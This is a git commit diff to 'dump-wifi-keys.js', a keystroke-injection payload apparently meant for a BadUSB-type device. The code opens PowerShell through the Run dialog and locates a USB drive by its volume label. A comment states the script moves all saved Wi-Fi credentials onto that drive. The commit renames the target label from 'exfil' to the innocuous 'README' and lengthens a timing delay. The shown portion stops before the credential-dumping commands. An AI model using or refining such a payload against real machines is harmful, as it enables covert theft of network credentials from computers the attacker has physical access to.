148fccb0d59b84614c7ff54fb0542d688e8e394c
Phillip Roach <108208254+philliproach@users.noreply.github.com>
2025-04-06 12:15:28 -0400

    Update dump-wifi-keys.js

--- payloads/security-scripts/ dump-wifi-keys/dump-wifi-keys.js
+++ payloads/security-scripts/ dump-wifi-keys/dump-wifi-keys.js
@@ -1,9 +1,11 @@
+//Set up MASS STORAGE. Replace "README" with your MASS STORAGE drive name. This script opens powershell, and moves all saved wifi credentials to the MASS STORAGE drive.
+
 layout('us') 
 press("GUI r")
 delay(200)
 type("powershell\n") 
-delay(1200)
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'exfil' } | select name \n") 
+delay(3000)
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name \n") 
 delay(1200)
 type("cd $usbpath.name\n")
 delay(1200)
